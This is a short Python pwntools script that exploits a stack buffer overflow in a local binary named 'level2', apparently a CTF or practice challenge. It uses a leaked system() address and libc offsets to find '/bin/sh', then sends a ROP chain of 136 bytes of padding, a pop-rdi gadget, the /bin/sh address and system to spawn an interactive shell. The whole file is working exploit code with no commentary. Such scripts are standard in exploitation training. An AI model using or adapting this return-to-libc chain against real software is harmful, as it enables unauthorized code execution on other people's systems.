from pwn import *
libc = ELF('./libc.so.6')


system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))
p = process('./level2')
context.log_level = 'debug'
gdb.attach(pidof(p)[0])
system_addr = int(p.recvline(),16)
log.info(hex(system_addr))


binsh_addr = system_addr - (system_offset - binsh_offset)
poprdi_ret = 0x00000000004008b3 # : pop rdi ; ret
payload = 'A'*136 + p64(poprdi_ret)  + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
